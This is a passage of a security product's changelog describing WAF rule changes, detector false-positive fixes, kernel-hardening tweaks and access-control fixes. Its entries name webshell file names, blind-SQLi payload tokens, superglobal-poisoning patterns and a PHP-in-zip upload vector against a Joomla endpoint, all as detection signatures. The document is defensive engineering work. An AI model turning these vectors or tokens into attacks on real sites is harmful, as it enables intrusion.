  `/var/lib/cfm/lua/cfm_ignore_nets.lua` with `os.WriteFile(…, 0640)`, whose
  perm arg is umask-filtered — so under a systemd `UMask=0077` service the file
  landed `0600`. The `cfm`-group OpenResty/Angie worker then could not read it,
  `loadfile()` returned nil (no panic, nothing logged), the ignore-nets ranges
  loaded empty, and `cfm.lua`'s `is_self_origin()` → Step 0a hard-bypass went
  **silently inert**: a request from the server's own `IGNORE_NETS` subnet was
  run through the full WAF/challenge instead of bypassing (operator hit it —
  own-subnet WordPress xmlrpc pingbacks got challenged despite `84.54.49.0/24`
  being in `IGNORE_NETS`). Now forces the mode with an explicit `os.Chmod(0640)`
  (umask-immune), matching `nft.writeSelfIPsLua` and the sslcollector snapshot
  writer, which already carried this guard. Regression test flips the process
  umask to `0077` and asserts the on-disk mode is still `0640`.
- Web detector: **the per-IP 403 flood counter (`IP403_COUNT` → `WEB/403`) now
  ignores static assets**, matching the sibling 404 and 40x-combo counters. It
  was the only 40x counter still counting `.jpg/.png/.gif/.css/.js/...` responses,
  so a customer legitimately browsing their **own** image-heavy WordPress/
  WooCommerce site self-blocked (`WEB/403`, TTL) when the **origin** (Apache/
  WordPress — hotlink protection, an origin security plugin, or broken Elementor
  thumbnails) returned 403 on many images: a single Elementor page fans out to
  dozens of asset requests, so hundreds of static-asset 403s crossed
  `IP403_COUNT` in minutes. Real 403-floods hit forbidden **non-static** paths
  (`wp-login`, `/.git`, config files), which still count. Regression tests added.
- WAF: **rule 611 (`WAF_BAD_UTF8`) no longer false-positives on raw binary
  uploads.** The detector already skipped `multipart/form-data` bodies, but the
  WordPress REST media endpoint (`POST /wp-json/wp/v2/media`) uploads a raw image
  with `Content-Type: image/jpeg` — not multipart — so the JPEG's bytes walked
  into the UTF-8 check and logged `UTF8_OVERLONG` on every legit media upload (a
  Greek admin on `mygreecetours.org` was hitting it repeatedly). The body walk is
  now gated on a *textual* content-type (`is_textual_body_content_type`), matching
  the sibling ctrl-chars (601) and webshell-body (404) detectors — so raw
  `image/*` / `application/octet-stream` / etc. bodies are skipped via any
  endpoint, while the urlencoded/JSON/XML overlong-slash bypass detection is
  unchanged. Rule 611 is `logonly`, so this was log noise, not a block. New test
  covers the raw `image/jpeg` case.
- ClamAV upload scan: **narrowed the resumed-POST scan exclusion to the
  challenge action only.** The replayed-POST follow-up excluded *every* resumed
  POST from `clamav.notify`, but only the `challenge` re-hit is force-blocked
  (`block_replayed`); a resumed POST whose hit degrades to `logonly` on replay
  (e.g. the original challenge came from a burst-window rule that is quiet by
  replay time while a logonly rule still matches) reaches origin and was
  slipping through **unscanned**. The gate now skips the scan only for
  `challenge`-action resumed POSTs, restoring the "scan everything the WAF lets
  through" invariant.
- Challenge: **`/.well-known/` requests no longer feed the log-driven per-IP
  challenge heuristics**, so a CA's ACME/DCV validator can't be mistaken for a
  scanner. A validator (e.g. Let's Encrypt / AutoSSL) legitimately hits many
  domains and many one-time token paths on a shared server, which tripped
  `CHALLENGE_UNIQHOSTS_IP` / `CHALLENGE_UNIQPATHS_IP` and challenge-flagged the
  validator IP. In OpenResty mode the in-path `/.well-known/` carve-out
  (`cfm.lua` Step 0a1) still served the token, but the flag polluted per-IP
  state; **in DNAT mode the flagged IP was redirected to the challenge server
  before the carve-out ran, so validation failed (`403 …acme:error:unauthorized`)
  and certificate issuance broke.** The webdetector now excludes the whole
  `/.well-known/` prefix from all challenge accounting (unique-hosts/paths,
  vhost unique-IP, RPS, 40x, …) — the decision-side mirror of the in-path
  carve-out. A `..` guard prevents `/.well-known/../` from escaping the
  exemption; normal-path scanners are unaffected.
- detectors config: **`detectors.conf` scalar settings with an inline
  `; comment` on the value line now take effect.** `kvInt`/`kvBool`/`kvDur`
  parsed the raw stored value, so `KEY = 5 ; note` became the string `"5 ; note"`,
  failed to parse, and silently fell back to the built-in default (only the
  string/float readers stripped inline comments). This masked several configured
  values. **Behaviour changes on deploy** (the configured values were written
  deliberately and now apply): the **health `/tmp` auto-cleanup activates**
  (`TMP_PCT = 85`, delete files older than `TMP_CLEAN_OLDER = 12h` when `/tmp`
  is ≥ 85% full — previously off because `TMP_PCT` read as 0); the
  **suspicious-vhost auto-challenge uses its configured thresholds** (fires at
  `UNIQIP_ON = 150` unique IPs instead of the code default 300, `MIN_UNIQIP`
  60 vs 80, `HOLDDOWN` 25m vs 10m — i.e. the intended, more aggressive tuning);
  and the `health` detector's `EVERY` is 20s (was falling back to 60s). Other
  inline-commented values were unaffected because the written value already
  equalled the default. If you do **not** want a given activation, set that key
  explicitly (e.g. `TMP_PCT = 0` to keep `/tmp` cleanup off). See CLAUDE.md §5.
  **Before rolling out**, grep your live `/etc/cfm/detectors.conf` for scalar
  lines carrying an inline `;`/`#` comment (`grep -nE '= *[^;#]*[^ ] +[;#]'`):
  those were silently using the default and will now take the written value.
  In particular a `mysql_governor` kill threshold written *below* its default
  with an inline comment (e.g. `LOCK_FANOUT_KILL = 5 ; aggressive`) would begin
  enforcing the tighter value — intended, but verify it's what you want.

### Security
- WAF: **new rule 414 (`rule_upload_archive_php`) blocks a PHP webshell hidden
  inside an uploaded `.zip`.** Traced to a 2026-07 Joomla mass-defacement
  ("ANTONKILL") that landed shells via `com_sppagebuilder&task=asset.uploadCustomIcon`
  uploading `ico*.zip`: the existing upload rules missed it because the outer
  multipart filename is `.zip` (401 allows it) and the `<?php` bytes are
  DEFLATE-compressed inside the archive (402's literal-tag scan can't see them);
  ClamAV extracted and scanned but the payload was obfuscated (`result=clean`).
  The new detector scans the multipart body for ZIP **local file headers**
  (`PK\3\4`) **and central-directory headers** (`PK\1\2` — the name PHP's
  `ZipArchive::extractTo` actually writes, defeating a benign-local/malicious-central
  name mismatch) and flags any entry whose cleartext name is PHP-executable
  (`.php`/`.php[3-8]`/`.phtml`/`.pht`/`.phar`/`.phps`) or a handler-override
  (`.htaccess`/`.user.ini`). Obfuscation-proof: it keys on the archive **entry
  name**, never the (compressed) content. Emitted under the **`WAF_UPLOAD_FNAME`
  family** (rule 414) so it inherits that family's `block` enforcement and
  `waf_security` autoblock intent — a php-in-zip on an asset endpoint is a
  webshell upload. **Scoped, provably, to Joomla** (`is_php_hostile_asset_upload`):
  a match requires BOTH `option=com_<component>` AND `task=asset.upload*`, each
  anchored to a query-param boundary. `option=com_` is a Joomla-only routing
  param, so WordPress (`action=`), OpenCart (`route=`), Magento, PrestaShop
  (`controller=`) and Drupal never match — which is what makes `block` safe with
  no cross-platform false positives. The whole plugin/theme/extension/backup
  ecosystem ships PHP-bearing `.zip` archives to installer/plugin endpoints, which
  are never matched; firing only on a Joomla asset (icon/image/font) upload, where
  a PHP-bearing archive is never legitimate, keeps them safe. Extend with a
  second, separately scoped clause as new non-Joomla vectors are confirmed. New
  test: `scripts/tests/cfm_waf_upload_archive_test.lua`.
- WAF: **split the webshell drop-path rule (410, `WAF_WEBSHELL`) into two
  confidence tiers and promoted the high-confidence half to `block`.** A
  6-server log review (mars/earth/titan/virgo/orion/rigel, ~256k WAF records)
  showed 6522 challenge-tier hits on this rule, almost all GET probes for known
  webshell drop-names. The proper-noun names with essentially zero legitimate
  use — `c99`/`c99shell`/`r57`/`r57shell`/`b374k`/`wso`/`wsoshell`/`ws0`/
  `webshell`/`minishell`/`p0wny`/`alfashell`/`indoxploit`/`aspxspy`/
  `aspxshell`/`jspspy`/`jshell` — now route to a **new block-tier rule 413
  (`rule_webshell_path_known`)**. The generic/ambiguous names that carry a
  residual false-positive tail — `adminer.php` (a real DB tool), `alfa.php`
  (the ALFA TEaM shell, but "alfa" is also a real word/brand), and short
  scratch-file names like `shell.php`/`x.php`/`1.php`/`cmd.jsp` — **stay at
  `challenge` on rule 410** (a legit page's visitors get a recoverable one-time
  challenge; a dropper is stopped).
  This mirrors the 437/438 split philosophy: never blanket-promote a family
  whose members span "always malicious" and "occasionally legitimate." Note
  `WAF_WEBSHELL` now has an edge-`block` rule (413), making it the **fifth**
  family eligible to drive `waf_security` autoblock in Phase 1 — but it is held
  at threshold **0** in **both the code default and the reference
  `detectors.conf`** (a deliberate exception to the "block-tier family arms to 1"
  rule), so the split adds **no** autoblock behaviour. This is intentional: a
  webshell GET-probe (`/c99.php`) is exactly what benign internet scanners
  (Shodan, Censys, uptime monitors, researchers) do, so auto-arming would nft-ban
  them fleet-wide. The edge still 403s the individual probe (harmless); an nft IP
  ban is a separate, deliberate opt-in (`WEBSHELL = 1`) after its own burn-in.
- WAF: the `WAF_BACKDOOR` content-heuristic rules **430 and 432 both stay at
  `logonly`** (neither is promoted). A promotion to `challenge` was considered
  and rejected after review: **432 (`rule_php_polyglot_full_body`)** — because
  `WAF_BACKDOOR` is a high-risk reason, a `challenge` here is converted to a
  **block** for a client holding a valid clearance cookie (`post_clearance_action`),
  and since the `BACKDOOR` family is autoblock-armed that converted block can earn
  a **6h nft ban of a logged-in customer** who uploads e.g. a PDF containing the
  literal string `<?php` via a raw-body endpoint — an unacceptable FP. **430
  (`rule_htaccess_poisoning`)** — because `AddType application/x-httpd-php` is a
  legitimate hand-written shared-hosting directive and the `addtype`/`sethandler`/
  `addhandler` branches are not prose-gated (only `.user.ini` is), so a
  forum/CMS post discussing it or a File-Manager `.htaccess` edit would trip it.
  Both promotions wait on their respective fixes (excluding post-clearance-
  converted hits from the autoblock feed; prose-gating the directive branches).
- WAF: **fixed silent `DefaultMode` drift in the Go rule mirror
  (`waf_rule_ids.go`).** Rules **410/411/412** (`rule_webshell_path`,
  `rule_webshell_ping`, `rule_polyglot_upload`) read `logonly` in the Go glossary
  while the live Lua CFG has run them at `challenge` — the same stale-metadata
  class as the 437 fix (the parity test checks id↔name, not mode, so it drifted
  unnoticed). The Go mirror now matches the live modes; this is glossary/CLI
  metadata only, no runtime behaviour change.
- WAF: **closed a webshell-upload bypass in the block-tier upload-filename rule
  (401, `WAF_UPLOAD_FNAME`).** `detect_upload_filename` blocked `.php`/`.php5`/
  `.phtml`/`.phar` (and `.jsp`/`.asp`/`.exe`/`.sh`/…) but missed the PHP
  alt-handlers `.pht` and `.phtm` that shared hosts commonly map to an
  interpreter, so a malicious multipart upload named `shell.pht` or `shell.phtm`
  reached origin. Those are **now matched** (including double-extension forms
  like `x.pht.jpg`), with the same block-tier enforcement and the narrow
  legit-PHP-upload endpoint carve-outs. **SSI pages (`.shtml`/`.shtm`) are
  deliberately NOT blocked** — they are a legitimate *static* file type on
  cPanel, and blocking them would false-positive on a customer uploading legit
  `.shtml` pages through a web file manager (and, since 401 is autoblock-armed,
  earn that customer a 6h IP ban); the SSI-exec risk is low (usually off via
  `IncludesNOEXEC`) and no `.shtml` appeared in captured upload samples.
  `.phps` (PHP source viewer) is likewise left out. New coverage test:
  `scripts/tests/cfm_waf_upload_fname_test.lua`.
- WAF: **promoted the SQLi families after a clean 6-server FP review** (2026-07,
  titan/virgo/orion/rigel/earth/mars): `rule_sqli` (301, `WAF_SQLI`)
  `challenge` → **`block`** (24/24 true positives, 0 FP — time-based/union/
  error-based sqlmap traffic against WP/PrestaShop/Fuel CMS), and
  `rule_sqli_blind_lexical` (309, `WAF_SQLI_LEXICAL`) `logonly` → **`challenge`**
  (188/188 TP, 0 FP — caught a distributed error-based `extractvalue()`/
  `floor(rand())` campaign the tier-1 tokens would have missed). Operators who
  pinned these in `/etc/cfm/*` keep their setting; only the shipped defaults
  change. `rule_superglobal_override` (318) stays `logonly` (0 hits observed).
- WAF: new rule **318** (`rule_superglobal_override`, `WAF_SUPERGLOBAL`,
  **`logonly`**) flags a request parameter whose **key** is a PHP superglobal /
  reserved name (`?_SERVER[x]=`, `&GLOBALS[x]=`, `_GET[x]=` in the body) — a
  PHP variable-poisoning attempt (`extract()` / `import_request_variables()` /
  register_globals patterns). Delimiter-anchored so ordinary fields like
  `db_server=` / `mail_server=` and superglobal-as-value (`?x=_SERVER`) do not
  match. First of the clean-room WAF additions from the NinjaFirewall gap
  analysis (`docs/waf-gap-analysis-ninjafirewall.md`); ships observe-only and
  is reviewed in the same WAF FP pass as the SQLi families.
- WAF: rule **301** (`rule_sqli`, `WAF_SQLI`) now catches the **time-based /
  boolean / error-based blind SQLi family** and **inspects the POST body**.
  Previously it scanned only `uri+args` with four narrow signatures
  (`union select`, `information_schema`, `or 1=1`, `' or '1'='1`), so a
  sqlmap scan against a form (a WHMCS ticket-submission flood was the trigger)
  sailed through — both because the payloads were body-borne and because the
  signatures missed `SLEEP`/`PG_SLEEP`/`WAITFOR DELAY`/`DBMS_PIPE` /
  `now()=sysdate()` / `=0+0+0+1`. Detection now covers those families across
  MySQL/PostgreSQL/MSSQL/Oracle/SQLite (whitespace/`+`-tolerant so
  form-urlencoded payloads still match) and runs over the body on POST.
  Detection is **split by false-positive risk**: DBMS-unique primitives
  (`pg_sleep`, `waitfor delay`, `dbms_pipe.receive_message`, `now()=sysdate()`,
  the `=0+0+0+1` boolean tail, …) stay on rule 301 at **`challenge`** (stops
  the bot; real browsers pass), while tokens that also collide with legitimate
  code/content (`benchmark(`, `extractvalue(`/`updatexml(` ≈ camelCase
  `extractValue(`/`updateXml(`, `floor(rand(`, `randomblob(`, `or sleep(` /
  `and sleep(`) ride a new rule **309** (`rule_sqli_blind_lexical`,
  `WAF_SQLI_LEXICAL`) at **`logonly`** — observed-only so a legitimate XML
  parser / updater / custom script can't be broken. Every captured WHMCS
  payload carries a tier-1 token, so the scan is fully challenged regardless.
  A 2-week FP review (before 2026-07-10) then decides promotion per tier — see
  `docs/waf.md` → "SQLi blind-family expansion".
- WAF: promoted rule **437** (`php_encoded_opener`, `WAF_BACKDOOR` encoded
  `<?php` opener) from `logonly` to **challenge**, and **removed** its FP-prone
  `<?=` short-opener variant. A five-server / 264k-event log review found the
  strong `<?php` openers (`B64_PHP_OPENER`, `URL_PHP_OPENER`) catching only real
  attacks (Bricks RCE `render_element`, `additional_webservices.php`, Amasty
  `uploadFile`) with **0 FP**, while the `<?=` short-opener (base64 `"PD89"`, a
  4-char prefix) was **6/6 false positives** on legitimate traffic
  (Jetpack/WordPress.com xmlrpc sync, Contact Form 7 submissions) — so the
  `PD89` detection was dropped rather than kept as logonly noise. Rule 436
  (`php_decode_chain`) stays `logonly` (0 hits across all five servers).

### Removed
- health detector: **removed the `HEALTH/PORT_CONN_SPIKE` per-port connection
  spike alert entirely.** The approximate per-local-port connection count (split
  out of `/proc/net/tcp{,6}`) was too noisy to be actionable and generated
  months of false positives / false alerts. The related config knobs
  (`PORT_WATCH`, `PORT_SPIKE_X`, `PORT_CONN_MIN`) are gone from
  `configs/detectors.conf` and are now silently ignored if left in an existing
  `/etc/cfm/detectors.conf`; the `port_conn` map is also dropped from the health
  snapshot JSON body. The aggregate connection-state spikes
  (`HEALTH/CONN_TOTAL_SPIKE`, **`HEALTH/CONN_EST_SPIKE`**, `HEALTH/SYN_RECV_SPIKE`)
  and the SYN_RECV / all-port talker probes are unchanged.

### Added
- MySQL governor: scoped (cPanel) users can now **kill their own stuck
  query/connection** — `POST /api/v1/mysql/user-kill?id=<pid>&type=query|connection`
  (default `query` = KILL QUERY, statement only). The target connection's
  `(user, db)` must be within the token's scope (admin tokens may target any);
  every kill is recorded in the governor audit ring/history. Scoped governor
  reads (`user-summary`/`user-kills`/`user-history`) were already live.

### Fixed
- kernsec: **TIPC-workload detection no longer false-positives on the iproute2
  `tipc` binary.** `HasTIPCWorkload` keyed on `/usr/{bin,sbin}/tipc`, but that
  binary ships with iproute2 — installed on essentially every modern host — so
  the gate read every box (cPanel/CloudLinux/Debian/EL) as a TIPC user. Effect:
  the `tipc` module blacklist was **silently skipped fleet-wide**, and any
  operator who deliberately set `state = force` for it hit an **UNSAFE FORCE**
  refusal on `cfm kernsec apply`. Detection now keys only on real-use signals:
  the `tipc` module loaded, `/proc/net/tipc`, `tipc-config` (the deliberate
  `tipcutils` package), or a `*tipc*.service` unit. Genuine TIPC/HA-cluster
  hosts are still skipped. (Same class of false positive the AFS detector
  already guards against with the openafs `/afs` stub.)
- kernsec: **KVM-host detection no longer false-positives on bare-metal
  hosting boxes.** `IsKVMHost` keyed purely on `kvm_intel`/`kvm_amd` being
  loaded, but the kernel auto-loads those on any VT-x/AMD-V CPU — so every
  modern cPanel/CloudLinux/DirectAdmin server was mislabeled a KVM hypervisor.
  That wrongly skipped the `vsock`/`llc`/`llc2` blacklists and the
  oops-reboot / coredump rules, and (because those rules then resolved to
  `skip`) made `cfm kernsec apply` refuse force-blacklisted modules with an
  UNSAFE FORCE error. `IsKVMHost` now requires the kvm module **and**
  corroborating hypervisor evidence — a `vhost*` backend module loaded
  (`vhost`/`vhost_net`/`vhost_vsock`, which only load once a guest starts),
  libvirt, a running QEMU process, or Proxmox. Genuine hypervisors are still
  detected; bare-metal hosting boxes are not.
- kernsec: **`cfm kernsec apply` no longer chokes on a tuned-managed
  `GRUB_CMDLINE_LINUX_DEFAULT`.** On EL/CloudLinux the `tuned` profile owns
  that line and fills it with shell expansions
  (`${GRUB_CMDLINE_LINUX_DEFAULT:+…}\$tuned_params`). kernsec reads `_DEFAULT`
  (for the next-boot drift view) but never writes it, yet it was decoding it
  with the strict round-trip-safe parser and aborting the whole apply with a
  "kernel cmdline contains shell metacharacter" error. `_DEFAULT` is now read
  **leniently** — shell tokens are kept verbatim (they never match a managed
  key, so drift is unaffected). The strict decoder still guards
  `GRUB_CMDLINE_LINUX`, the line kernsec actually rewrites.
- kernsec: `fs.protected_regular` lowered from **2 to 1** (`kspp.fs`, Tier 1).
  Value 2 also covers group-writable sticky dirs, which **breaks cPanel's DNS
  Zone Editor**; 1 still protects the real attack surface (non-owned regular
  files in world-writable sticky dirs like `/tmp`). kernsec is declarative, so
  the next `cfm kernsec apply` reconciles any host currently at `=2` down to
  `=1` live (`sysctl -w`) and in the managed file — no manual step.
- WAF: `WAF_BAD_UTF8` (rule 611, `logonly`) now skips known binary-ish legit
  endpoints — WordPress optimization-detective web-vitals and `async-upload.php`
  media uploads — reusing (and generalising) the carve-out the ctrl-chars rule
  already had. A five-server / 264k-event log review found these were the bulk
  of its `logonly` false-positive noise on real Greek WP traffic (mobile
  web-vitals POSTs + admin image uploads). Rule stays `logonly`.
- Admin UI: scoped (cPanel) users no longer see admin-only nav items. The nav
  filter only hid the Dashboard; **Web Bots, Notifier, Detectors, Settings and
  Debug stayed visible** to scoped users and 403'd on click. The authoritative
  admin-only nav list now covers all of them (backends were already
  fail-closed; this removes the dead/broken links). Also removed a stale
  divergent matcher copy in `ui-scope.js` and corrected
  `docs/endpoint_scope_inventory.md` (which wrongly listed the scope-validated
  `waf/engine/summary` and `{challenge,waf}/exclude/*` endpoints as admin-only).

### Security
- MySQL governor `user-kill` now resolves the target from a **live** processlist
  lookup (`information_schema.PROCESSLIST WHERE ID=?`) and scope-checks that live
  row immediately before issuing the KILL, closing the TOCTOU window where a pid
  could be reused between the periodic snapshot and the kill.
- `TokenStore.Issue` **fails closed**: it refuses to mint a scoped (non-admin)
  token with no scope at all (no vhosts, db-users, or databases); the issue API
  returns 400. Defense-in-depth behind the role-based gate below.
- MySQL governor scoped routes now **fail closed by authenticated role**, not by
  an empty scope map. `scopedMySQLFilterHandler` previously treated any caller
  with an empty vhost scope as admin (unfiltered); a scoped token whose scope
  was somehow empty (malformed/legacy) would have been mis-handled as admin —
  and on the new `user-kill` **write** that meant killing any connection. It now
  passes through only for a confirmed admin role and fails closed otherwise.
- `POST /api/v1/firewall/block` is now **admin-only server-side** (wrapped in
  `adminOnlyHandler`, like the MySQL/detectors/system-status routes).
  Previously the route had no role/scope check, so a scoped (cPanel/DA) token
  could call it directly and block any IP host-wide — bypassing the UI, which
  already hid the action. The customer-facing unblock endpoint is unchanged.

### Fixed
- Admin UI: scoped (cPanel) viewer tokens can now toggle **Challenge/WAF and
  HTTP/3 for their own in-scope vhosts** from the per-vhost controls. The
  client-side write guard was blanket-blocking all writes for `viewer` tokens
  (`read-only scoped viewer token`) even though the daemon already authorises
  these mutations by host scope. Self-service writes are re-allowed client-side
  (the server still enforces the vhost allowlist); genuinely admin-only writes
  stay blocked. Also classifies `v1/waf/`+`v1/http3/` as writes so they are no
  longer silently exempt from the viewer guard. When identity resolution falls
  back (token present but `/me` unresolved) the scoped exclude-management
  capability now fails closed instead of defaulting open.
- Admin UI: scoped users can now create/edit/delete/simulate **throttle &
  traffic rules** (`v1/webdet/rules/*`) for their own in-scope vhosts. The
  controls page already showed the rule form to scoped users and the daemon
  already scope-checks these writes (`scopeAllowsVhosts`), but the client guard
  classified them as admin-only, so saving failed with `read-only scoped viewer
  token`.

## 2026-06-17

### Added
- `CLAUDE.md` — agent/contributor guide: architecture map, build/CI gates,
  enforced conventions, and a "where we historically lost the ball" section
  distilled from the first ~1000 PRs.
- `CHANGELOG.md` — this file. Changelog tracking starts from today; the
  date-based version scheme is now documented and maintained going forward.
